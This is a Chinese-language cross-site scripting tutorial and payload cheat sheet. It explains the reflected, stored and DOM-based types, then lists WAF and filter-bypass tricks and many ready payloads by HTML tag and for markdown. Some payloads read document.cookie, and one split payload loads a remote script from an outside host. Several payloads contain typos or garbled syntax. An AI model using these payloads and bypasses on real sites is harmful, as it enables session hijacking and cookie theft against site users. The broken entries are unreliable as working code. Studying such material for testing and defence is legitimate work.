# XSS

XSS全称是cross site scripting，中文译为跨站脚本攻击。这是一种将任意 Javascript 代码插入到其他Web用户页面中执行以达到攻击目的的漏洞。它做为一种攻击方式，主要是用来窃取信息用的。

## 危害

* 网络钓鱼，包括获取各类用户账号
* 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作
* 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等
* 强制弹出广告页面、刷流量等
* 网页挂马
* 进行恶意操作，如任意篡改页面信息、删除文章等
* 进行大量的客户端攻击，如ddos等
* 获取客户端信息，如用户的浏览历史、真实p、开放端口等
* 控制受害者机器向其他网站发起攻击
* 结合其他漏洞，如csrf，实施进步危害
* 提升用户权限，包括进一步渗透网站
* 传播跨站脚本蠕虫等

## 分类

XSS分为反射型、存储型、DOM型

### 反射型

又称非持久型XSS，这种攻击属于一次性攻击，只是简单的把用户输入的数据“反射”给浏览器。恶意代码一般存放于链接当中，攻击者将包含XSS代码的恶意链接发送给目标用户，当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS，也就是说攻击者往往需要诱使用户点击恶意链接才能攻击成功。

#### 常见注入点

* 搜索栏
* 用户登录入口
* 输入表单

### 存储型

又称持久型XSS，比反射型XSS更具有威胁性，攻击脚本会永久的存储在目标服务器的数据库或文件中，具有一定的隐蔽性。这种攻击方式多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本与正常信息一起注入到留言中，随着留言被服务器存储下来，恶意脚本也被存储到存储器中。当其他用户浏览这个被注入恶意脚本的留言时，恶意脚本就会在用户的浏览器被执行。存储型XSS能将恶意代码永久的嵌入页面中，所有访问这个页面的用具都将成为受害者。

#### 常见注入点

* 论坛
* 博客
* 留言板
* 反馈
* 评论
* 日志
* 用户资料
* 标签
* 聊天处
* 富文本编辑器

### DOM型

DOM型的XSS是通过修改页面DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。
并且DOM型XSS是基于JS上的，并不需要与服务器进行交互，它只发生在客户端处理数据的阶段。当用户请求一个包含XSS恶意代码的URL，服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码。

#### 常见注入点

* 通过js脚本对文档对象进行编辑，从而修改页面的元素。

举例

    ?Message=hacker";var%20a="&Message=";alert(1)-"
    
对应的js

    <script>
    var msg = "hacker";
    var a=", ";
    alert(1)-""
    </script>
    
例子二：网络消息型的DOM型XSS

    <script>
    window.addEventListener('message', function(e) {
        eval(e.data);
    });
    </script>
    
这段代码很容易受到攻击，因为攻击者可以通过构造以下iframe来注入JavaScript的Payload：

    <iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

由于事件侦听器不验证消息的来源，并且postMessage()方法指定targetOrigin "*"，因此事件侦听器接受Payload并将其传递到接收器，在本例中为eval()函数。
将上面的payload写入html文件里，部署到服务器中发送给受害者
    
## WAF绕过

### 数组传参

举例

    ?limit=%3Ca/&limit==%221%22on%09click=%22j%09avascript:alert%60%60%22%3E1%3C/a%3E
    
第一个limit先传一个标签进去，构造第二个limit为第一个标签作闭合，构造一条完整的xss语句。

### 特殊符号限制

可以尝试使用HTML实体编码或Unicode编码绕过

#### 限制"绕过

使用'

    <img src=1 onclick=alert('1')>
    
#### 显示'绕过

使用/

    <img src=1 onclick=alert(/1/)>
    
不使用'

    <img src=1 onclick="alert(1)">

####<>限制绕过

的会处理尖括号和尖括号中的内容，将其替换成空。所以可以使用双写半开括号"<<"绕过:

    <img src=1 onerror="prompt(1)"<
    
#### ()限制绕过

有的对等号和左括号进行过滤，所以使用反引号代替括号，在通过编码解决。

    <script>setTimeoutprompt\u00601\u0060;</script>
    
### 回车换行绕过

很多时候，回车换行能绕过很多的限制

### 标签过滤绕过

fuzz各种标签，检查是否存在拦截或者过滤

fuzz的范围：属性内-标签内-标签外，不分先后

### 大小写绕过

    <ScRipt>ALeRt("XSS");sCRipT>
    
### 嵌套绕过

嵌套多个HTML标签或JS事件处理程序，来绕过对标签的限制

    <div><p>这是一段注入的文本</p><script>alert('xss');</script></div>    
    
### 零宽字符绕过

攻击者可以使用零宽字符来欺骗过滤器并隐藏恶意代码或绕过长度限制。零宽字符是一类不可见的Unicode字符，它们在文本中不会显示出来，但会被计算在字符串的长度中。

零宽空格：它的Unicode码点是U+200B。

零宽度非断空格：它的Unicode码点是U+FEFF。

### 编码绕过

* HTML实体编码
* URL编码
* Unicode编码
* 十六进制

### rasp绕过

标签后面加单双引号

    <a'/onclick=confirm()>
    
构造无效标签

    <abc1 onclick=confirm()>
    
标签名称长度大于12

    <abcdefabcdefa onclick=confirm()>
    
### 长度限制绕过

最短拆分

多个插入点，仅能插入小于等于n的字符串，payload较长，可以尝试拆分。

举例

    <script>
    z=document.write("<script src=http://me.cn/xstest></script>")
    eval(z)
    </script>
    
然后我们尝试将它拆成十个部分：

    <script>z='document'</script>
    <script>z=z+'.write('</script>
    <script>z=z+'"<scrip'</script>
    <script>z=z+'t src=h'</script>
    <script>z=z+'ttp://m'</script>
    <script>z=z+'e.cn/xs'</script>
    <script>z=z+'test></'</script>
    <script>z=z+'script>'</script>
    <script>z=z+'")'</script>
    <script>eval(z)</script>
    
### HTTP请求方式修改

有些WAF只检测URL的内容，不检测POST的body内容

### 垃圾数据溢出

有的WAF对超过的内容不进行检测，可以填写无影响的垃圾数据进行填充

### 特殊字符干扰

比如 `/ #`

### URL跳转未校验协议

    ?url=javascript:alert(1)
    
### 拼接绕过

举例

    <script>var a = alert;a(1);</script>
    
### 利用Function

JS有一个特性是Function()(); 大写的Function和小写的function其含义有所不同。对于Function()来说，写在其第一个括号内的JS语句会被直接执行。

    Function(alert('1'))();
    
如果alert被过滤,直接使用atob();函数，它的作用是把base64编码后的内容还原，我们直接把alert(1) base64编码一下
这个base64编码后的字符串填入atob中时，必须要去掉最后面的等于号，不然会失效

    Function(atob('YWxlcnQoMSk'))();

    
## 常用标签

### img标签

举例

    <img src=javascript:alert("xss")>
    <IMG SRC=javascript:alert(String.formCharCode(88,83,83))>
    <img scr="URL"style='Xss:expression(alert(/xss));'
    <img src="x"onerror=alert(1)>
    <img src="1"onerror=eval("alert('xss')")>
    <img src=1onmouseover=alert('xss')>
    <img STYLE="background-image:url(javascript:alert('XSS'))">
    
### a标签

举例

    <a href="https://www.baidu.com">baidu</a>
    <a href="javascript:alert('xss')">aa</a>
    <a href=javascript:eval(alert('xss'))>aa</a>
    <a href="javascript:aaa"onmouseover="alert(/xss/)">aa</a>
    <a href=""onclick=eval(alert('xss'))>aa</a>
    <a href=kycg.asp?ttt=1000onmouseover=prompt('xss')y=2016>aa</a>
    
### input标签

举例

    <input value=""onclick=alert('xss')type="text">
    <input name="name"value=""onmouseover=prompt('xss')bad="">
    <input name="name"value=""><script>alert('xss')</script>
    
### form标签

举例

    <form action=javascript:alert('xss')method="get">
    <form action=javascript:alert('xss')>
    <form method=postaction=aa.asp?onmouseover=prompt('xss')>
    <form method=postaction=aa.asp?onmouseover=alert('xss')>
    <form action=1onmouseover=alert('xss)>
    <form method=postaction="data:text/html;base64,<script>alert('xss')</script>">
    <form method=postaction="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    
### iframe标签

举例

    <iframe src=javascript:alert('xss');height=5width=1000/><iframe>
    <iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
    <iframe src="data:text/html;base64,<script>alert('xss')</script>">
    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    <iframe src="aaa"onmouseover=alert('xss')/><iframe>
    <iframe src="javascript&colon;prompt&lpar;xss&rpar;"></iframe>
    <iframe/onreadystatechange=alert(630)></iframe>
    
### svg标签

举例

    <svg onload=alert(1)>   
    
### video标签

举例

    <video onloadstart=alert(1) autoplay="autoplay" source src="https://www.runoob.com/try/demo_source/movie.mp4" type="video/mp4"></video>
    
### body标签

举例

    <body+onload=alert(document.cookie)>
    
### div标签

举例

    <div/onmouseover='alert(630)'>
    
### script标签

举例

    <script src="data:text/javascript,alert(630)"></script>
    <script>alert(630);</script>
    
## markdown的xss

markdown语言从文本-指定格式的转换过程可以看作一系列的html转换，最终以html标签的形式存储在页面上，因此markdown编辑器也可能出现XSS漏洞

### 利用过程

    [kevil](http://baidu.com) -> <a href="http://baidu.com"></a>
    
举例

    [a](javascript:prompt(document.cookie))
    [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
    ![a](javascript:prompt(document.cookie))\
    <javascript:prompt(document.cookie)>
    ![a'"`onerror=prompt(document.cookie)](x)\
    [citelol]: (javascript:prompt(document.cookie))
    
## 